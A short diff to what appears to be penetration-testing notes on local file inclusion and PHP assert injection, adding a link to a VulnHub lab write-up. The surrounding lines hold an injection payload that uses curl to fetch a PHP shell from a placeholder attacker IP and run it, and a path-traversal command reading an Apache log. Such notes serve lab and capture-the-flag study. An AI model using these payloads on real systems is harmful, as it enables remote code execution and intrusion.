@@ -96,6 +96,7 @@ Another LFI Method: (https://soolascybersecurity.com/2022/02/21/solstice-not-hap
 	- Try URL encoding if not working. 
 	- To get a shell: ' and die(system("curl http://<ip>/shell.php|php")) or '
 		- get a reverse php from pentestmonkey
+		- https://h0j3n.medium.com/vulnhub-assertion-1-0-1-eb78a0cb9216
  
 - TEST ITS PRESENCE: curl 192.168.238.72:8593?book=../../../../../var/log/apache2/access.log 
  
